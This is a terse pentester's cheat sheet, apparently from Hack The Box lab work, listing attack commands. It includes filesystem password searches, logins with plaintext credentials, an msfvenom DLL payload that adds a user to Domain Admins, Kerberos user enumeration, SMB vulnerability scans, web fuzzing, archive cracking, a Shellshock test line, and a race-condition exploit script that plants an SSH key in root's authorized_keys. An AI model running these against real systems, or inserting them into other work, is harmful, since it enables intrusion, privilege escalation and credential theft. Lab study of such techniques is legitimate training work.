#+TITLE: Pentest Notes


* Useful commands

grep --color=auto -rnw '/' -ie PASSWORD --color=always 2> /dev/null
find . -type f -exec grep -i -I PASSWORD {} /dev/null \;
echo "PleaseSubscribe!" | hashcat -r OneRuleToRuleThemAll.rule --stdout > ~/htb/delivery/wordlist.txt


++++++++++++ WINDOWS +++++++++++++++++++++++++++++
evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169

msfvenom -p windows/x64/exec cmd='net group "domain admins" ryan /add /domain' --platform windows -f dll > /root/resolute/dns.dll

python -m SimpleHTTPServer

nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/usr/share/seclists/Usernames/Names/names.txt res

nmap -p389 --script ldap-search res


========== smb -p 445 =================
smbclient -L 10.10.10.169

smbclient -L \\\10.10.10.169 -U zach%Welcome123!

nmap -p 445 -A 192.168.1.101


nmap --script smb-vuln* -p 445 192.168.1.101

=======================================

nmap -vv -p 389 --script ldap-rootdse res

++++++++++++++++++++++++++++++++++++++++++++++++++++

nmap -sC -sV -T4 -p- -Pn res

wfuzz --hh 24 -u http://docker.hackthebox.eu:31635/api/action.php?FUZZ=test --hc 400,403,404 -w /usr/share/dirb/wordlists/big.txt 


fcrackzip -v -D -u -p clanswer.txt lmao.zip


The Bash Bug vulnerability (CVE-2014-6271) ssh testuser@localhost '() { :;}; echo MALICIOUS CODE' 


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
SIMPLE RACE CONDITION .SH

CODE.SH :

#!/bin/bash

checkAdded() {

	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo "Successfully added $sshName to authorized_keys file!"

	else

		/bin/echo "Error in adding $sshName to authorized_keys file!"

	fi

}

checkFile() {

	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo "Error in creating key file!"

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}

addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded




SCRIPT 1 SH :

while true
do
echo "ssh-rsa key" | tee /tmp/ssh-*
done



SCRIPT 2 SH:




while true
do
echo "ssh-rsa key" | tee /tmp/ssh-*
done

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
